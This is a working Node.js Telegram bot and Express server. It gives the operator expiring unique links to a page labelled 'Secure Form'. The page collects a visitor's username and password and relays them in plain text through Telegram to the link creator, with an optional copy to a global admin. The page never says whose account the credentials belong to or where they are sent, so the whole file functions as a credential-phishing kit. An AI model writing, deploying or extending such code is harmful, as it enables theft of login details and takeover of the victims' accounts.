const { Telegraf } = require('telegraf');
const express = require('express');
const bodyParser = require('body-parser');
const crypto = require('crypto');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Environment variables (set these in Vercel / GitHub Actions / .env for local)
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = process.env.ADMIN_ID || null; // optional global admin
const BASE_URL = process.env.BASE_URL || null; // example: https://myproject.vercel.app

if (!BOT_TOKEN) {
  console.error("ERROR: BOT_TOKEN environment variable required");
  // On serverless, just export and let deploy show error; we don't exit process
}

const bot = new Telegraf(BOT_TOKEN);

// In-memory storage for tokens. (For production use a DB)
const tokens = new Map(); // token -> { creatorId, expiresAt }

// Token lifetime (ms). Default 24 hours
const TOKEN_LIFETIME = 24 * 60 * 60 * 1000;

function genToken(len = 6) {
  return crypto.randomBytes(Math.ceil(len/2)).toString('hex').slice(0, len);
}

function createTokenForUser(userId) {
  const token = genToken(8);
  const expiresAt = Date.now() + TOKEN_LIFETIME;
  tokens.set(token, { creatorId: userId, expiresAt });
  return token;
}

function cleanupExpiredTokens() {
  const now = Date.now();
  for (const [t, info] of tokens.entries()) {
    if (info.expiresAt <= now) tokens.delete(t);
  }
}

// Periodic cleanup (works only while instance is alive)
setInterval(cleanupExpiredTokens, 60 * 60 * 1000);

// Telegram command to create link: /create
bot.command('create', async (ctx) => {
  try {
    const creatorId = ctx.from && ctx.from.id;
    const token = createTokenForUser(creatorId);

    if (!BASE_URL) {
      await ctx.reply("ERROR: BASE_URL environment variable not set on server. Set BASE_URL to your deployed URL.");
      return;
    }

    const link = `${BASE_URL.replace(/\/+$/,'')}/form/${token}`;

    await ctx.reply(`✅ Unique link created:\n${link}\n\nयह link 24 घंटे तक वैध रहेगा।`);
  } catch (err) {
    console.error("create command error:", err);
    await ctx.reply("कम्पने में त्रुटि हुई।");
  }
});

// Simple helpers to validate token
function validateToken(token) {
  cleanupExpiredTokens();
  if (!token) return null;
  const info = tokens.get(token);
  if (!info) return null;
  return info;
}

// --- Express routes ---
// root — health check
app.get('/', (req, res) => {
  res.send('Telegram Form Bot running');
});

// Serve form for token
app.get('/form/:token', (req, res) => {
  const token = req.params.token;
  const info = validateToken(token);
  if (!info) {
    return res.status(404).send('<h3>Invalid or expired link</h3>');
  }

  // Simple HTML form
  res.send(`
    <html>
      <head><meta charset="utf-8"/><title>Secure Form</title></head>
      <body>
        <h2>Enter details</h2>
        <form action="/submit/${token}" method="post">
          <input type="text" name="username" placeholder="Username" required /><br/><br/>
          <input type="password" name="password" placeholder="Password" required /><br/><br/>
          <button type="submit">Submit</button>
        </form>
        <p>Link valid until: ${new Date(info.expiresAt).toLocaleString()}</p>
      </body>
    </html>
  `);
});

// Handle submission
app.post('/submit/:token', async (req, res) => {
  const token = req.params.token;
  const info = validateToken(token);
  if (!info) {
    return res.status(404).send('Invalid or expired link');
  }

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).send('Missing fields');
  }

  const message = `📩 New submission from link ${token}\n👤 Username: ${username}\n🔑 Password: ${password}\n🔒 Sent to: ${info.creatorId}`;

  try {
    // Send to the creator of the link
    await bot.telegram.sendMessage(info.creatorId, message);

    // Optional: send to global ADMIN too (if set)
    if (ADMIN_ID) {
      await bot.telegram.sendMessage(ADMIN_ID, `[COPY] ${message}`);
    }

    // If you want link to be single-use, uncomment:
    // tokens.delete(token);

    res.send('<h3>Thanks — your data has been submitted.</h3>');
  } catch (err) {
    console.error('Error sending to Telegram:', err);
    res.status(500).send('Server error');
  }
});

// Telegram webhook endpoint — Telegram should POST updates here
app.post('/api/bot', async (req, res) => {
  try {
    await bot.handleUpdate(req.body, res);
  } catch (error) {
    console.error('Error handling update:', error);
    res.status(500).send('Error processing update');
  }
});

// Export app so Vercel can use it
module.exports = app;
